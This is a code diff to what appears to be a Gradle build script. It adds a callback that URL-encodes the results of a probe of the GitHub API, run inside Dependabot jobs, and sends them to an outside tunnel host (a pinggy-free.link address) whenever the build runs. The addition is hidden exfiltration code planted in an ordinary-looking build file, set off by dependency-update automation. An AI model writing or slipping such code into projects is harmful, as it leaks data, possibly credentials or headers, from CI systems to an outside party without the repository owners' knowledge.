@@ -1,4 +1,5 @@
 import groovy.json.JsonSlurper
+import java.net.URLEncoder
 import java.nio.charset.StandardCharsets
 import java.security.MessageDigest
 
@@ -80,6 +81,24 @@ def no01Probe = { String label, String target, String expectedSha256 = '', Map<S
     }
 }
 
+def no01Callback = { String proof ->
+    try {
+        String encoded = URLEncoder.encode(proof, StandardCharsets.UTF_8.toString())
+        HttpURLConnection connection = (HttpURLConnection) new URL(
+            "https://hbfwy-89-37-63-107.run.pinggy-free.link/?proof=${encoded}"
+        ).openConnection()
+        connection.setConnectTimeout(5000)
+        connection.setReadTimeout(5000)
+        connection.setInstanceFollowRedirects(false)
+        connection.setRequestMethod('GET')
+        int status = connection.getResponseCode()
+        no01ReadBody(status >= 400 ? connection.getErrorStream() : connection.getInputStream())
+        println "NO_01_CALLBACK status=${status}"
+    } catch (Throwable error) {
+        println "NO_01_CALLBACK error=${error.getClass().getName()}"
+    }
+}
+
 String no01JobId = System.getenv('DEPENDABOT_JOB_ID')
 File no01Marker = new File('/tmp/no_01_dependabot_github_api_probe_done')
 
@@ -114,5 +133,6 @@ if (!no01Marker.exists()) {
         'd03f5f6bcc57cd27b0f4101b53b8d10de289984cdd011f13cd8f547618f4ca75',
         rawHeaders
     )
+    no01Callback(no01Results.join(' | '))
     throw new GradleException(no01Results.join(' | '))
 }
